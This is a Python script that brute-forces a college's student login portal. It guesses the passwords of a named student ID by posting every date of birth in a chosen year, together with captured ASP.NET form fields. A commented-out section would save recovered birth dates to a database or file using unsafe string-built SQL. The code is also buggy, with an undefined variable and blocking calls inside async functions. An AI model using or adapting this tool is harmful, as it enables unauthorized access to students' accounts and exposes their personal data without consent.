import requests
import mysql.connector
import asyncio

student_login_url = 'http://studentlogin.kcgcollege.ac.in/'

payload = {
    '__EVENTTARGET' : '' ,
    '__EVENTARGUMENT' : '',
    '__LASTFOCUS' : '',
    '__VIEWSTATE' : '/wEPDwUJMjkwMTA2NTY5D2QWAgIDD2QWCgIDDxAPFgYeDURhdGFUZXh0RmllbGQFCGNvbGxuYW1lHg5EYXRhVmFsdWVGaWVsZAUMY29sbGVnZV9jb2RlHgtfIURhdGFCb3VuZGdkEBUBGUtDRyBDb2xsZWdlIG9mIFRlY2hub2xvZ3kVAQIxMxQrAwFnFgFmZAIFDxBkEBUCC1JvbGwgTnVtYmVyEVJlZ2lzdGVyZWQgTnVtYmVyFQIBMAExFCsDAmdnFgFmZAIHDw9kFgQeC3BsYWNlaG9sZGVyBQtSb2xsIE51bWJlch4MYXV0b2NvbXBsZXRlBQNvZmZkAgsPD2QWAh8EBQNvZmZkAg8PDxYCHgdWaXNpYmxlaGRkZEUh8Q9VeEnmpvJTjWVIwQmtVpX5IBYcjkAZZqWYNv5m', 
    '__VIEWSTATEGENERATOR' : 'CA0B0334',
    '__EVENTVALIDATION' : '/wEdAAfEhVpMiIC9PlqrGxNesSta1ewWtm3evXPJ0S9N/1pup/olUdBTEtKbUYVn9qLUVnP36l7NJf9XLe0xTP1byily7ATayzSAKKfWGUr2Dqcb+ZxpWckI3qdmfEJVCu2f5cHN+DvxnwFeFeJ9MIBWR6935FJfAFbS62yyYTlq6hIkdlrWUyRFAO0MmBe4dmPHJe8=',
    'rblOnlineAppLoginMode' : '0',
    'txtuname' : None,
    'txtpassword' : None,
    'Button1' : 'Login'
}

time_out_dates = [] 

async def check_date(The_day_):

    global payload

    payload['txtpassword'] = The_day_
                
    try:
        page = requests.post(student_login_url, data = payload, timeout = 10)
        print(The_day_)
    except:
        #print('timed out', The_day_)
        time_out_dates.append(The_day_)               
        

    #print(page.url)
    if page.url != student_login_url: 
        #print('dob found 1')        
        #print(The_day_)  
        #print('dob found 2')             
        print(The_day)

async def find_student_dob(user_id, year_of_birth = '2002'):    
    
        

    months = {
        '01' : 31, '02' : 29, '03' : 31, '04' : 30,
        '05' : 31, '06' : 30, '07' : 31, '08' : 31,
        '09' : 30, '10' : 31, '11' : 30, '12' : 31,
    }

    payload['txtuname'] = user_id
    The_day = None
    
    years = (year_of_birth,)   

    check_list = []

    for str_yob in years:
        for str_month in ('01','02','03','04','05','06','07','08','09','10','11','12'):
            days = months[str_month]

            for day in range(1,days + 1):
                str_day = str(day)
                if len(str_day) == 1:
                    str_day = '0' + str_day

                The_day = str_day + str_month + str_yob

                check_list.append(asyncio.create_task(check_date(The_day)))
                    
        
    await asyncio.sleep(0)
    await asyncio.gather(*check_list)
    print('done')
    """
        for date_ in time_out_dates: #check timeout dates
            if check_date(date_):
                try:
                    mysql_cursor.execute("INSERT INTO dobs VALUES('{}','{}')".format(user_id,The_day))
                except:
                    with open('dates.txt', 'a') as file:
                        file.write('{}  {}'.format(user_id, The_day))

                mysql_cursor.close()
                mycon.close()
                time_out_dates = []

                return date_
        """

                    
       
    #raise Exception   

asyncio.run(find_student_dob('20cs023'))
#find_student_dob('20cs023')  

#find_student_dob('311020104023', '2003')                        
            



